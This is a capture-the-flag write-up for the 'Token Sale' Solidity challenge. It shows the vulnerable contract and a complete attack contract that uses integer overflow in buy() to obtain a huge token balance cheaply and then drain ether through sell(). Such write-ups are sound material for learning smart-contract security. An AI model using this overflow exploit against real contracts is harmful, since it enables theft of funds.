# Token Sale

Complete attack code:

```
pragma solidity 0.4.21;

contract TokenSaleChallenge {
    mapping(address => uint256) public balanceOf;
    uint256 constant PRICE_PER_TOKEN = 1 ether;

    function TokenSaleChallenge(address _player) public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance < 1 ether;
    }

    function buy(uint256 numTokens) public payable {
        require(msg.value == numTokens * PRICE_PER_TOKEN);

        balanceOf[msg.sender] += numTokens;
    }

    function sell(uint256 numTokens) public {
        require(balanceOf[msg.sender] >= numTokens);

        balanceOf[msg.sender] -= numTokens;
        msg.sender.transfer(numTokens * PRICE_PER_TOKEN);
    }
}

contract AttackTokenSale {
    TokenSaleChallenge public victimContract = TokenSaleChallenge(0xc29A7F50F2018b974a6546b6CaCc55836A828Adf);
    uint256 constant public MAX_VALUE = uint256(-1);
    uint256 public numTokens = (MAX_VALUE / 10**18) + 1;
    uint256 public sendValue = (numTokens * 10**18) - (MAX_VALUE) - 1;


    function attack() external payable {
        victimContract.buy.value(sendValue)(numTokens);
    }

    function sell() external payable {
        victimContract.sell(1);
    }

    function() public payable {

    }
}
```

Solution:

This attack relies on the lack of over flow protection. When using the `buy`
function we pass in a number (115792089237316195423570985008687907853269984665640564039458)
that will overflow to a value that is close to half an ether (415992086870360064)

Later we can `sell` one token and meet the `completed` requirments.
